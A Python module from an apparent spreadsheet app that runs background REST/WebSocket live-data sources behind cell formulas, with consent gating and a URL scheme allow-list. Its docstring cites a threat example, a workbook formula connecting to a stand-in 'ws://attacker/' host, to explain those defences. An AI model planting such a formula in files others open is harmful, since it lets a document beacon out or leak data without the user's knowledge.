"""Live-data hub — background push/poll sources behind the REST/WEBSOCKET formulas.

The spreadsheet formulas ``=REST(url, path, interval)`` and
``=WEBSOCKET(url, path)`` do not fetch anything themselves. Instead they
*subscribe* to a :class:`LiveHub`, which owns one background daemon thread per
distinct source. Each thread pulls data (polling for REST, a persistent frame
stream for WEBSOCKET), extracts the requested value with a small JSON path, and
stashes the latest value where the formula can read it cheaply. Every update
bumps a monotonic *generation* counter; a front-end (GUI ``QTimer`` or the TUI
draw loop) watches that counter and triggers a recalc + redraw when it changes.

Because the formulas are marked volatile (``depgraph.ALWAYS_DIRTY_FUNCS``), each
recalc re-reads the hub, so a cell tracks its source with no per-cell wiring.

Security — consent gated, off by default
-----------------------------------------
A workbook loaded from disk can contain ``=WEBSOCKET("ws://attacker/…")``. To
stop a malicious file phoning home the moment it opens, the hub starts
**disabled**: :meth:`LiveHub.subscribe` refuses to open any connection until the
user opts in (settings ``live_data_enabled`` / the GUI toggle), and disabling it
again tears every connection down. URL schemes are allow-listed to
http/https/ws/wss so ``file://`` and friends can never be reached.

The transport layer is injectable, so the whole hub is unit-testable with a fake
in-memory source and never touches the network in tests.
"""

from __future__ import annotations

import json
import threading
from typing import Any, Callable, Iterator

#: URL schemes a live source may use. Anything else (``file:``, ``gopher:`` …)
#: is rejected before a socket is ever opened.
ALLOWED_SCHEMES = ("http", "https", "ws", "wss")

#: Marker returned to a cell when live data is disabled (consent off). Visible
#: and self-explanatory in the grid, distinct from the ``#N/A`` used while a
#: source is enabled but has not delivered its first value yet.
OFF_MARKER = "#OFF!"

# A transport is a generator: given a URL plus a stop Event and interval, it
# yields ``(ok, payload)`` tuples — ``(True, parsed_json_object)`` on success or
# ``(False, error_message)`` on a transient failure. It should honour the stop
# event promptly and return when it is set.
Transport = Callable[..., Iterator[tuple]]


class LiveError(Exception):
    """Raised when a live source cannot be created (bad scheme, hub disabled)."""


def _scheme(url: str) -> str:
    return url.split("://", 1)[0].lower() if "://" in url else ""


def check_url(url: str) -> None:
    """Raise :class:`LiveError` unless *url* uses an allow-listed scheme."""
    sch = _scheme(url)
    if sch not in ALLOWED_SCHEMES:
        raise LiveError(f"unsupported live-data URL scheme: {sch or '(none)'}")


def extract_path(obj: Any, path: str) -> Any:
    """Dig *path* out of a decoded-JSON *obj*.

    Path syntax is a subset of the usual dotted/bracket form: dotted keys for
    mappings and ``[i]`` (possibly negative) for sequence indices, e.g.
    ``"data.tickers[0].price"``. An empty path returns *obj* whole. A missing
    key/index or a type mismatch raises :class:`KeyError`/:class:`IndexError`,
    which the subscription records as the cell's error.
    """
    if path is None or path == "":
        return obj
    cur = obj
    for key in _split_path(path):
        if isinstance(key, int):
            cur = cur[key]  # IndexError / TypeError bubble up
        else:
            if isinstance(cur, dict):
                cur = cur[key]  # KeyError bubbles up
            else:
                raise KeyError(key)
    return cur


def _split_path(path: str) -> list:
    """Tokenize ``a.b[0][-1].c`` into ``['a', 'b', 0, -1, 'c']``."""
    tokens: list = []
    for dotted in path.split("."):
        name, _, rest = dotted.partition("[")
        if name:
            tokens.append(name)
        while rest:
            idx, _, rest = rest.partition("]")
            idx = idx.strip()
            if idx:
                try:
                    tokens.append(int(idx))
                except ValueError:
                    tokens.append(idx.strip("'\""))
            # a trailing "[" opens the next index for the next loop turn
            rest = rest.partition("[")[2] if "[" in rest else ""
    return tokens


def coerce(val: Any) -> Any:
    """Map a decoded-JSON leaf to a cell-friendly value.

    Scalars pass through (numbers stay numbers so they compute); ``None`` becomes
    an empty string; a dict/list leaf is compacted to JSON text so the cell shows
    something rather than a Python repr.
    """
    if val is None:
        return ""
    if isinstance(val, (bool, int, float, str)):
        return val
    try:
        return json.dumps(val, separators=(",", ":"), ensure_ascii=False)
    except (TypeError, ValueError):
        return str(val)


class _Subscription:
    """One background source: a daemon thread feeding a latest-value slot."""

    def __init__(self, hub: "LiveHub", key: str, url: str, path: str,
                 interval: float, transport: Transport) -> None:
        self._hub = hub
        self.key = key
        self.url = url
        self.path = path
        self.interval = interval
        self._transport = transport
        self.value: Any = None      # latest coerced value, or None before first
        self.error: str | None = None
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        self._thread = threading.Thread(
            target=self._run, name=f"livedata-{self.key}", daemon=True)
        self._thread.start()

    def _run(self) -> None:
        try:
            for ok, payload in self._transport(
                    self.url, interval=self.interval, stop_event=self._stop):
                if self._stop.is_set():
                    break
                if ok:
                    try:
                        self.value = coerce(extract_path(payload, self.path))
                        self.error = None
                    except (KeyError, IndexError, TypeError) as exc:
                        self.error = f"path not found: {exc}"
                else:
                    self.error = str(payload)
                self._hub._bump()
        except Exception as exc:  # noqa: BLE001 — a dead source must not crash
            self.error = f"live source failed: {exc}"
            self._hub._bump()

    def stop(self) -> None:
        self._stop.set()

    def join(self, timeout: float = 1.0) -> None:
        if self._thread is not None:
            self._thread.join(timeout=timeout)


class LiveHub:
    """Registry of live sources, keyed so identical formulas share one thread."""

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._subs: dict[str, _Subscription] = {}
        self._generation = 0
        self._enabled = False

    # -- consent -----------------------------------------------------------

    @property
    def enabled(self) -> bool:
        with self._lock:
            return self._enabled

    def set_enabled(self, flag: bool) -> None:
        """Enable or disable all live data. Disabling tears every source down."""
        flag = bool(flag)
        with self._lock:
            changed = flag != self._enabled
            self._enabled = flag
        if not flag:
            self.stop_all()
        elif changed:
            self._bump()  # nudge front-ends to recalc the now-live cells

    # -- generation counter ------------------------------------------------

    def generation(self) -> int:
        """Monotonic counter; increments on every value update or state change."""
        with self._lock:
            return self._generation

    def _bump(self) -> None:
        with self._lock:
            self._generation += 1

    # -- subscription ------------------------------------------------------

    def subscribe(self, kind: str, url: str, path: str = "",
                  interval: float = 5.0, *, transport: Transport | None = None) -> str:
        """Ensure a source for (*kind*, *url*, *path*, *interval*) is running.

        Idempotent: identical arguments reuse the same thread. Returns the key
        used with :meth:`latest`. Raises :class:`LiveError` if the hub is
        disabled or the URL scheme is not allowed. A *transport* may be injected
        (tests); otherwise it is resolved from *kind*.
        """
        if not self.enabled:
            raise LiveError("live data is disabled (enable it in settings)")
        if transport is None:
            check_url(url)
        key = make_key(kind, url, path, interval)
        with self._lock:
            sub = self._subs.get(key)
            if sub is None:
                tr = transport or _resolve_transport(kind)
                sub = _Subscription(self, key, url, path, interval, tr)
                self._subs[key] = sub
                sub.start()
        return key

    def latest(self, key: str) -> tuple[Any, str | None]:
        """Return ``(value, error)`` for *key*; ``(None, None)`` if unknown."""
        with self._lock:
            sub = self._subs.get(key)
        if sub is None:
            return (None, None)
        return (sub.value, sub.error)

    def source_count(self) -> int:
        with self._lock:
            return len(self._subs)

    def stop_all(self) -> None:
        """Stop and forget every source (called on disable / app shutdown)."""
        with self._lock:
            subs = list(self._subs.values())
            self._subs.clear()
        for sub in subs:
            sub.stop()
        for sub in subs:
            sub.join(timeout=1.0)


def make_key(kind: str, url: str, path: str, interval: float) -> str:
    return f"{kind}|{url}|{path}|{interval}"


def _resolve_transport(kind: str) -> Transport:
    if kind == "rest":
        return rest_transport
    if kind == "websocket":
        return websocket_transport
    raise LiveError(f"unknown live-source kind: {kind}")


# --------------------------------------------------------------------------
# Real transports (stdlib only). Both are thin loops around a fetch; the hub,
# path extraction, and coercion above carry the logic and the test coverage.
# --------------------------------------------------------------------------

def rest_transport(url: str, *, interval: float, stop_event: threading.Event) -> Iterator[tuple]:
    """Poll a JSON REST endpoint every *interval* seconds via stdlib urllib."""
    import urllib.request

    delay = max(0.5, float(interval))
    while not stop_event.is_set():
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "abax-livedata/1", "Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=10) as resp:  # noqa: S310 — scheme checked
                raw = resp.read()
            yield (True, json.loads(raw.decode("utf-8", "replace")))
        except Exception as exc:  # noqa: BLE001 — transient; report and retry
            yield (False, f"REST error: {exc}")
        if stop_event.wait(delay):
            break


def websocket_transport(url: str, *, interval: float, stop_event: threading.Event) -> Iterator[tuple]:
    """Stream JSON text frames from a WebSocket, reconnecting on drop.

    Delegates the RFC 6455 handshake and framing to :mod:`abax.core.wsclient`.
    Each text frame is parsed as JSON; non-JSON frames are surfaced as a
    transient error rather than killing the stream.
    """
    from .wsclient import ws_messages

    backoff = 1.0
    while not stop_event.is_set():
        try:
            for message in ws_messages(url, stop_event=stop_event):
                if stop_event.is_set():
                    break
                try:
                    yield (True, json.loads(message))
                except (TypeError, ValueError):
                    yield (False, f"non-JSON frame: {message[:80]!r}")
                backoff = 1.0
        except Exception as exc:  # noqa: BLE001 — connection dropped; reconnect
            yield (False, f"WebSocket error: {exc}")
        if stop_event.wait(min(30.0, backoff)):
            break
        backoff = min(30.0, backoff * 2)


#: Process-wide default hub used by the REST/WEBSOCKET formulas and the app.
HUB = LiveHub()
